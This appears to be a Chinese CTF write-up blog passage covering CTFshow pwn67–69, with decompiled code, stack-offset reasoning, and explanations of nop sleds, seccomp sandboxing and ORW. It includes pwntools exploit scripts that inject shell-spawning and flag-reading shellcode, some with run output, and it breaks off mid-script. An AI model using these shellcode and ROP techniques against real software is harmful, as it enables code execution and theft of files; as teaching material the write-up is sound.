<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> position; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> (*v5)(<span class="type">void</span>); <span class="comment">// [esp+0h] [ebp-1010h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> seed[<span class="number">1027</span>]; <span class="comment">// [esp+4h] [ebp-100Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  seed[<span class="number">1025</span>] = (<span class="type">unsigned</span> <span class="type">int</span>)&amp;argc;</span><br><span class="line">  seed[<span class="number">1024</span>] = __readgsdword(<span class="number">0x14u</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  logo();</span><br><span class="line">  srand((<span class="type">unsigned</span> <span class="type">int</span>)seed);</span><br><span class="line">  Loading();</span><br><span class="line">  acquire_satellites();</span><br><span class="line">  position = query_position();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;We need to load the ctfshow_flag.\nThe current location: %p\n&quot;</span>, position);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What will you do?\n&gt; &quot;</span>);</span><br><span class="line">  fgets((<span class="type">char</span> *)seed, <span class="number">4096</span>, <span class="built_in">stdin</span>);<span class="comment">//缓冲区的长度为 0x1000 字节（4096）</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Where do you start?\n&gt; &quot;</span>)</span><br><span class="line">  <span class="comment">//用户可输入任意内存地址，程序会直接调用该地址处的代码</span></span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%p&quot;</span>, &amp;v5);</span><br><span class="line">  v5();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>query_position() 可以知道缓冲区在堆栈上的大致位置，</p>
<p>跟进query_position()：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">query_position</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// [esp+3h] [ebp-15h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14u</span>);</span><br><span class="line">  v2 = rand() % <span class="number">1337</span> - <span class="number">668</span>;</span><br><span class="line">  v3 = &amp;v1 + v2; <span class="comment">// 计算 &amp;v1 偏移 v2 字节后的地址</span></span><br><span class="line">  <span class="keyword">return</span> &amp;v1 + v2; <span class="comment">// 返回这个随机栈地址</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>v2 &#x3D; rand() % 1337 - 668; ：这行代码使用 rand 函数生成一个随机数，并通过取模运算将其限制在范围 0 到 1336 之间。然后，从结果中减去 668，得到一个范围在-668 到 668 之间的随机整数，并将其存储在变量 v2 中。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">低地址（栈底方向） </span><br><span class="line">+-------------------------+ &lt;-- ebp-0x1010 (buffer 起始)</span><br><span class="line">| buffer[0x1000]          |  大缓冲区，占 0x1000 字节</span><br><span class="line">| ...                     |</span><br><span class="line">| buffer[0]               |</span><br><span class="line">+-------------------------+ &lt;-- ebp-0x10 (padding 起始)</span><br><span class="line">| padding [0x10]          | 填充区，占0x10 字节（对齐用）【就是个栈桢对齐规则，不懂】</span><br><span class="line">+-------------------------+ &lt;-- ebp+0x4 (返回地址)</span><br><span class="line">| 返回地址（4字节）          |  call 指令自动压栈，函数返回时用</span><br><span class="line">+-------------------------+ &lt;-- ebp (旧 ebp)</span><br><span class="line">| 旧 ebp（4字节）           |  保存上一层栈帧的 ebp，函数返回时恢复</span><br><span class="line">+-------------------------+ &lt;-- ebp-0x15 (局部变量区)</span><br><span class="line">| stk [ebp-0x15]          |  局部变量区，占 0x15 字节（21字节）</span><br><span class="line">| ...                     |</span><br><span class="line">高地址（栈顶方向）</span><br></pre></td></tr></table></figure>

<p> 21 (0x15) + 4 + 4 + 16 (0x10) &#x3D; 45 字节 （0x2d）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#main函数从开始到执行到*query_position()函数的汇编代码</span><br><span class="line">.text:0804894F                 push    ebp; 保存调用者的ebp</span><br><span class="line">.text:08048950                 mov     ebp, esp; 设置新的ebp为当前esp</span><br><span class="line">.text:08048952                 push    ebx</span><br><span class="line">.text:08048953                 push    ecx</span><br><span class="line">.text:08048954                 sub     esp, 1010h; 为局部变量分配0x1010字节空间</span><br><span class="line">#此时栈顶ESP = EBP - 4 (ebx) - 4 (ecx) - 0x1010</span><br><span class="line">...</span><br><span class="line">.text:08048978                 sub     esp, 8; 为函数参数准备空间</span><br><span class="line">.text:0804897B                 push    0     ; 第一个参数buf</span><br><span class="line">.text:0804897D                 push    eax   ; 第二个参数stream</span><br><span class="line">.text:0804897E                 call    _setbuf</span><br><span class="line">.text:08048983                 add     esp, 10h ; 恢复栈指针</span><br><span class="line">#这里的add esp, 10h操作是为了恢复栈指针。实际上，函数调用前 ESP 减少了 0x10 (8 字节 sub + 8 字节 push)，但函数返回后 ESP 增加了 0x10，这是因为 C 调用约定中，调用者负责清理栈参数.</span><br><span class="line">#此时esp=ebp-0x4-0x4-0x1010-0x8-0x4-0x4+0x10=ebp-0x4-0x4-0x1010</span><br><span class="line">...</span><br><span class="line">.text:08048991                 sub     esp, 0Ch ; 为函数参数准备空间</span><br><span class="line">.text:08048994                 push    eax      ; 第一个参数seed</span><br><span class="line">.text:08048995                 call    _srand</span><br><span class="line">.text:0804899A                 add     esp, 10h ; 恢复栈指针</span><br><span class="line">#此时的栈顶为ebp-0x4-0x4-0x1010-0xc-0x4+0x10=ebp-0x4-0x4-0x1010</span><br><span class="line">.text:0804899D                 call    Loading</span><br><span class="line">.text:080489A2                 call    acquire_satellites</span><br><span class="line">.text:080489A7                 call    query_position</span><br></pre></td></tr></table></figure>

<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">高地址</span><br><span class="line">+-------------------------+</span><br><span class="line">│      main 函数栈帧        │</span><br><span class="line">+-------------------------+  &lt;-- main 的 EBP（新 EBP）    </span><br><span class="line">|  保存的旧 EBP             |  4B (EBP)  </span><br><span class="line">+-------------------------+                                                      </span><br><span class="line">|    保存的 EBX            |  4B (EBP-4)                                       </span><br><span class="line">+-------------------------+                                                   </span><br><span class="line">|   保存的 ECX             |  4B (EBP-8)                                         </span><br><span class="line">+-------------------------+                                                     </span><br><span class="line">|    未使用空间             |    </span><br><span class="line">|    ...                  |  0x1010 - 0x100C = 4B                             </span><br><span class="line">+-------------------------+                                                      </span><br><span class="line">│   seed 变量              |  4B (EBP-0x100C) &lt;-- main 局部变量                </span><br><span class="line">+-------------------------+                                                     </span><br><span class="line">|    v5 变量               |  4B (ebp-0x1010) &lt;-- main 局部变量  </span><br><span class="line">+-------------------------+</span><br><span class="line">|  未使用空间（0x10 相关）    |  #其实是add esp, 0x10 </span><br><span class="line">|    ...                  |  </span><br><span class="line">+-------------------------+  &lt;-- ebp-0x1010-0x4-0x4</span><br><span class="line">|调用query_position的返回地址|  4B (EBP-0x15 - 4 = EBP-0x19)         </span><br><span class="line">+-------------------------+                </span><br><span class="line">│   query_position 函数栈帧 |                                                   </span><br><span class="line">+-------------------------+  &lt;-- query_position 的 EBP                          </span><br><span class="line">|   保存的 main 的 EBP      |  4B (EBP) </span><br><span class="line">+-------------------------+                                                 </span><br><span class="line">|  query_position 局部变量  |                                                   </span><br><span class="line">|  ...                    |  0x15 - 4 = 0x11B                          </span><br><span class="line">+-------------------------+                                                     </span><br><span class="line">|   v1 变量                |  4B (EBP-0x15) &lt;-- query_position 局部变量     </span><br><span class="line">+-------------------------+  &lt;-- ESP（栈顶）</span><br><span class="line">低地址</span><br><span class="line">所以，可以看出来v1 到 seed 的偏移 = 0x15（v1 在 query_position 的偏移） </span><br><span class="line">                   + 0x4（query_position 保存的 main ebp） </span><br><span class="line">                   + 0x4（query_position 的返回地址） </span><br><span class="line">                   + 0x10（main 栈帧内的对齐/残留空间） </span><br><span class="line">                 = 0x2D</span><br></pre></td></tr></table></figure>

<h6 id="nop-sled-空操作雪橇"><a href="#nop-sled-空操作雪橇" class="headerlink" title="nop sled 空操作雪橇:"></a>nop sled 空操作雪橇:</h6><p>nop sled 是一种可以破解栈随机化的缓冲区溢出攻击方式。</p>
<p>攻击者通过输入字符串注入攻击代码。在实际的攻击代码前注入很长的 nop 指令 （操作，仅使程序计数器加一）序列，</p>
<p>只要程序的控制流指向该序列任意一处，程序计数器逐步加一，直到到达攻击代码的存在的地址，并执行。</p>
<p>由于栈地址在一定范围的随机性，攻击者不能够知道攻击代码注入的地址，而要执行攻击代码需要将函数的返回地址更改为攻击代码的地址（可通过缓冲区溢出的方式改写函数返回地址）。所以，只能在一定范围内（栈随机导致攻击代码地址一定范围内随机）枚举攻击代码位置（有依据的猜）。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">不用 nop sled ， 函数返回地址 -------&gt; 攻击代码。</span><br><span class="line">使用 nop sled ， 函数返回地址 -------&gt; nop 序列（顺序执行） 直到攻击代码地址。</span><br></pre></td></tr></table></figure>

<p>为了安全地“绕过”不知道缓冲区的确切开始位置,我们可以：</p>
<ol>
<li>将 shellcode 填充为以 1336 nop 条指令开头 ( 0x90 )</li>
<li>使用的返回值 query_position ，添加 0x2d （如前所述），<strong>然后添加</strong> <strong>668</strong>。</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">payload = <span class="string">b&#x27;\x90&#x27;</span>*<span class="number">1336</span> + shellcode</span><br><span class="line">io.recvuntil(<span class="string">b&quot;The current location: 0x&quot;</span>)</span><br><span class="line">addr = u64(unhex(io.recvline(keepends=<span class="literal">False</span>).zfill(<span class="number">16</span>)), endian=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"><span class="comment">#读取一行数据（keepends=False 去掉换行符），然后用 zfill(16) 补零到 16 个字符,unhex(...)：把十六进制字符串转成字节序列；u64(..., endian=&#x27;big&#x27;)：将字节序列按大端序转成 64 位整数[十六进制字符串已经是大端序了]</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;Addr: &quot;</span> + <span class="built_in">hex</span>(addr))</span><br><span class="line">io.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">sh = addr + <span class="number">668</span> + <span class="number">0x2d</span>;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Sending: &quot;</span> + <span class="built_in">hex</span>(sh))</span><br><span class="line">io.sendline(<span class="built_in">hex</span>(sh).encode())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 155</span><br><span class="line">Addr: 0xff9924d2</span><br><span class="line">Sending: 0xff99279b</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">ctfshow_flag</span><br></pre></td></tr></table></figure>

<p>还看了这个师傅的<a target="_blank" rel="noopener" href="https://blog.csdn.net/akdelt/article/details/135954144?spm=1001.2014.3001.5502">CTFshow-pwn入门-栈溢出 (慢慢更_ctfshow pwn50-CSDN博客</a></p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">unsigned int seed[1027]; // [esp+4h] [ebp-100Ch] BYREF</span><br><span class="line">char v1; // [esp+3h] [ebp-15h] BYREF //</span><br><span class="line"></span><br><span class="line">gdb ./pwn</span><br><span class="line">pwndbg&gt; b *0x080489A7#断在query_position()的call指令处</span><br><span class="line">pwndbg&gt; info registers ebp</span><br><span class="line">ebp            0xffa51578          0xffa51578</span><br><span class="line">pwndbg&gt; si# 执行push ebp，旧ebp被压入栈，esp减少4</span><br><span class="line"># 此时EIP会指向0x80487d2（mov ebp, esp），ebp仍为0xffa51578</span><br><span class="line">pwndbg&gt; si</span><br><span class="line"># 执行mov ebp, esp，更新ebp为当前esp的值（新ebp）</span><br><span class="line"># 此时EIP指向0x80487d4（下一条指令）</span><br><span class="line">   0x80487d1 &lt;query_position&gt;       push   ebp</span><br><span class="line"> ► 0x80487d2 &lt;query_position+1&gt;     mov    ebp, esp  </span><br><span class="line"> </span><br><span class="line">EBP =&gt; 0xffa50558 —▸ 0xffa51578 ◂— 0</span><br><span class="line">两个 ebp 相差 0x1020, 1020 = 4 + 4 + padding + 0x100C,padding = 0xC</span><br><span class="line">所以 v1 到 seed 偏移量 = 0x15 + 4 + 4 + padding = 41</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br><span class="line">io = process(&#x27;./pwn&#x27;)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">io.recvuntil(b&quot;The current location: &quot;)</span><br><span class="line">v5_addr = eval(io.recvuntil(b&quot;\n&quot;,drop=True))#eval() 把这个十六进制字符串转换成整数</span><br><span class="line">padding = 12</span><br><span class="line">v1_seed = 0x15+4+4+padding #0x29也可以（不知道怎么看的）</span><br><span class="line">print(hex(v5_addr))</span><br><span class="line"></span><br><span class="line">payload = flat([b&quot;\x90&quot;*1336,shellcode])//相加</span><br><span class="line">sh_addr = hex(v5_addr+668+v1_seed)encode()</span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&quot;What will you do?\n&gt; &quot;, payload) </span><br><span class="line">io.sendlineafter(b&quot;Where do you start?\n&gt; &quot;, sh_addr)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="pwn68"><a href="#pwn68" class="headerlink" title="pwn68"></a>pwn68</h2><p>Hint：64bit nop sled</p>
<p>分析结果同上，仅仅是32位与64位的区别。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">char seed[4104]; // [rsp+10h] [rbp-1010h] BYREF</span><br><span class="line">char v1; // [rsp+Bh] [rbp-15h] BYREF</span><br><span class="line">ebp:0x7ffe53d64860-&gt;0x7ffe53d63830 </span><br><span class="line">两个 ebp 相差 0x1030, 0x1030 = 8 + 8 + padding + 0x1010,padding = 0x10</span><br><span class="line">所以 v1 到 seed 偏移量 = 0x15 + 8 + 8 + padding = 0x35</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">payload = <span class="string">b&#x27;\x90&#x27;</span>*<span class="number">1336</span> + shellcode</span><br><span class="line">io.recvuntil(<span class="string">b&quot;The current location: 0x&quot;</span>)</span><br><span class="line">addr = u64(unhex(io.recvline(keepends=<span class="literal">False</span>).zfill(<span class="number">16</span>)),endian=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"><span class="comment">#读取一行数据（keepends=False 去掉换行符），然后用 zfill(16) 补零到 16 个字符</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;Addr: &quot;</span> + <span class="built_in">hex</span>(addr))</span><br><span class="line">io.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">sh = addr + <span class="number">668</span> + <span class="number">0x35</span>;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Sending: &quot;</span> + <span class="built_in">hex</span>(sh))</span><br><span class="line">io.sendline(<span class="built_in">hex</span>(sh).encode())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 71</span><br><span class="line">Addr: 0x7ffcb41930cc</span><br><span class="line">Sending: 0x7ffcb419339d</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">ctfshow_flag</span><br></pre></td></tr></table></figure>

<h2 id="pwn69"><a href="#pwn69" class="headerlink" title="pwn69"></a>pwn69</h2><p>Hint：可以尝试用ORW读flag flag文件位置为&#x2F;ctfshow_flag</p>
<p><strong><code>ORW指的是Open-Read-Write技术，是一种利用系统调用读取文件内容（如flag文件）的攻击方法。</code></strong></p>
<p><strong><code>ORW通过以下三个系统调用实现：</code></strong></p>
<p><strong><code>open：打开目标文件，获取文件描述符。</code></strong></p>
<p><strong><code>read：通过文件描述符读取文件内容到缓冲区。</code></strong></p>
<p><strong><code>write：将缓冲区的内容写入标准输出。</code></strong></p>
<p>当攻击者通过漏洞控制程序执行流程后，可以注入或执行类似ORW的代码来读取敏感文件。例如，攻击者可以通过ROP（Return-Oriented Programming）或直接注入汇编代码来实现ORW。</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       amd64-64-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br></pre></td></tr></table></figure>

<p>64位仅部分开启RELRO。其他保护全关</p>
<p>IDA查看main函数（依据函数功能修改对应函数名）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  mmap((<span class="type">void</span> *)<span class="number">0x123000</span>, <span class="number">0x1000u</span>, <span class="number">6</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  seccomp();</span><br><span class="line">  setvbuf();</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*mmap()函数的主要用途有三个：</span></span><br><span class="line"><span class="comment">1、将一个普通文件映射到内存中，通常在需要对文件进行频繁读写时使用，这样用内存读写取代I/O读</span></span><br><span class="line"><span class="comment">写，以获得较高的性能；</span></span><br><span class="line"><span class="comment">2、将特殊文件进行匿名内存映射，可以为关联进程提供共享内存空间；</span></span><br><span class="line"><span class="comment">3、为无关联的进程提供共享内存空间，一般也是将一个普通文件映射到内存中。*/</span></span><br></pre></td></tr></table></figure>

<p>把从0x123000开始的地址，大小为0x1000的长度，权限改为可写可执行</p>
<p>跟进seccomp()：</p>
<p><strong>Seccomp（Secure Computing Mode）是 Linux 内核中的一种安全机制，用于限制进程可以调用的<code>系统调用</code>（Syscalls），从而减少潜在的攻击面。</strong></p>
<p><strong>沙盒环境：Seccomp 常用于沙盒环境中，限制程序的权限，防止恶意程序通过高风险系统调用攻击系统。</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">seccomp</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = seccomp_init(<span class="number">0</span>);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112</span>, <span class="number">0</span>, <span class="number">0</span>); <span class="comment">//初始化 seccomp 上下文</span></span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112</span>, <span class="number">60</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> seccomp_load(v1);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*2147418112表示 “允许执行该系统调用”；第三个参数（如0、1、2、60）：系统调用号（syscall number）对应read，write，open，exit；最后一个参数0：表示 “不检查系统调用的参数”（允许该系统调用的任何参数）*/</span></span><br></pre></td></tr></table></figure>

<p>沙盒过滤，seccomp-tools 是一个用于分析和调试 Seccomp 策略的工具集，它可以帮助你检查程序是否启用了 Seccomp 以及其具体的 Seccomp 配置。通过运行 seccomp-tools dump .&#x2F;pwn，你可以查看目标程序 .&#x2F;pwn 的 Seccomp 策略。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ seccomp-tools dump ./pwn</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = <span class="built_in">arch</span></span><br><span class="line"> 0001: 0x15 0x00 0x08 0xc000003e  <span class="keyword">if</span> (A != ARCH_X86_64) goto 0010</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  <span class="keyword">if</span> (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x05 0xffffffff  <span class="keyword">if</span> (A != 0xffffffff) goto 0010</span><br><span class="line"> 0005: 0x15 0x03 0x00 0x00000000  <span class="keyword">if</span> (A == <span class="built_in">read</span>) goto 0009</span><br><span class="line"> 0006: 0x15 0x02 0x00 0x00000001  <span class="keyword">if</span> (A == write) goto 0009</span><br><span class="line"> 0007: 0x15 0x01 0x00 0x00000002  <span class="keyword">if</span> (A == open) goto 0009</span><br><span class="line"> 0008: 0x15 0x00 0x01 0x0000003c  <span class="keyword">if</span> (A != <span class="built_in">exit</span>) goto 0010</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br></pre></td></tr></table></figure>

<p>只有read，write，open，exit可以使用，使用 open–&gt;read–&gt;write 这样的orw的方式</p>
<p>跟进漏洞函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now you can use ORW to do&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x38u</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;No you don&#x27;t understand I say!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>明显的溢出漏洞 那么思路就是先写入orw类型的shellcode，然后跳转去执行，buf的大小只有0x20，感觉不够我们写全rop攻击链，程序一开始的时候给我们开辟了0x100可执行的空间，打算在这边写shellcode，然后用buf的溢出跳转过来执行我们的shellcode。</p>
<p>写orw的shellcode：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">orw_shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;/ctfshow_flag&quot;</span>) <span class="comment"># 打开根目录下的ctfshow_flag文件</span></span><br><span class="line">orw_shellcode += shellcraft.read(<span class="number">3</span>,mmap,<span class="number">100</span>) <span class="comment"># 读取文件标识符是3的文件0x100个字节存放到mmap分配的地址空间里[0代表stdin，1代表stdout，2代表标准错误输出。其他文件就是从3开始了。]</span></span><br><span class="line">orw_shellcode += shellcraft.write(<span class="number">1</span>,mmap,<span class="number">100</span>) <span class="comment"># 将mmap地址上的内容输出0x100个字节</span></span><br><span class="line">shellcode = asm(orw_shellcode)</span><br><span class="line"><span class="comment">#read里的fd写3是因为程序执行的时候文件描述符是从3开始的，write里的1是标准输出到显示器</span></span><br></pre></td></tr></table></figure>

<p>然后buf里面的rop攻击链：</p>
<p>buf里面的rop攻击链是要往mmap里写入orw_shellcode,让程序跳转到mmap去执行orw_shellcode</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = asm(shellcraft.read(<span class="number">0</span>,mmap,<span class="number">0x100</span>))+asm(<span class="string">&quot;mov rax,0x123000; jmp rax&quot;</span>)</span><br><span class="line"><span class="comment">#从标准输入（文件描述符 0）读取最多 0x100 字节的内容到 mmap_ar 指向的内存区域。</span></span><br><span class="line"><span class="comment">#将 rax 寄存器设置为 0x123000，然后跳转到该地址。这里的 0x123000 是 mmap_ar 的地址，用于跳转到攻击者控制的内存区域。</span></span><br></pre></td></tr></table></figure>

<p>这样buf里的rop就达到了我们想要的目的，下面就要想办法让buf里的内容被执行，发现该程序有jmp rsp</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ROPgadget --binary pwn  | grep jmp</span><br><span class="line">0x0000000000400a01 : jmp rsp</span><br></pre></td></tr></table></figure>

<p>其实就是这个后门函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sub_4009EE</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __asm &#123; jmp     rsp &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>**<code>rsp是栈顶指针寄存器，jmp rsp的作用是返回到栈顶，由于调用时是一个新的函数，所以开辟了新的栈，所以jmp rsp实际上是返回这条指令位置+8处。</code>**那意味着我们可以通过这条指令跳转到当前栈顶处然后执行我们布置在栈上shellcode从而实现ORW。</p>
<p>利用它可以跳转到buf去执行，buf地址是rsp-0x30[buf的起始地址到 “返回地址” 的偏移:(rbp + 8) - (rbp - 0x20) &#x3D; 0x28(<code>+8是旧rbp的长度</code>),再写入<code>8字节</code>的<code>jmp rsp</code>地址（因为返回地址占 8 字节）]</p>
<p>所以buf中完整的rop攻击链：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">jmp_rsp = <span class="number">0x400a01</span></span><br><span class="line">payload = asm(shellcraft.read(<span class="number">0</span>,mmap,<span class="number">0x100</span>))+asm(<span class="string">&quot;mov rax,0x123000; jmp rax&quot;</span>)</span><br><span class="line"><span class="comment"># buf里的rop是往mmap里读入0x100长度的数据，跳转到mmap的地址执行</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment"># buf的大小是0x20，加上rbp 0x8是0x28，用&#x27;\x00&#x27;去填充剩下的位置</span></span><br><span class="line">payload += p64(jmp_rsp)+asm(<span class="string">&quot;sub rsp,0x30; jmp rsp&quot;</span>) <span class="comment"># 返回地址写上跳转到rsp</span></span><br><span class="line"><span class="comment">#asm(&quot;sub rsp,0x30; jmp rsp&quot;):调整栈指针（rsp）的位置，使其指向栈上的有效代码</span></span><br><span class="line"><span class="comment">#sub rsp, 0x30：将栈指针rsp减去0x30（48 字节）。由于栈是向下增长的（地址从高到低），这会让rsp指向更靠前的栈内存（地址更小的位置）。</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;do&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br></pre></td></tr></table></figure>

<p>将buf中的rop链发送后，再传入orw_shellcode就能读出flag了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;new-window&#x27;</span>]</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">mmap = <span class="number">0x123000</span></span><br><span class="line">jmp_rsp = <span class="number">0x400a01</span></span><br><span class="line">orw_shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;/ctfshow_flag&quot;</span>)</span><br><span class="line">orw_shellcode += shellcraft.read(<span class="number">3</span>,mmap,<span class="number">100</span>)</span><br><span class="line">orw_shellcode += shellcraft.write(<span class="number">1</span>,mmap,<span class="number">100</span>)</span><br><span class="line">shellcode = asm(orw_shellcode)</span><br><span class="line">payload = asm(shellcraft.read(<span class="number">0</span>,mmap,<span class="number">0x100</span>))+asm(<span 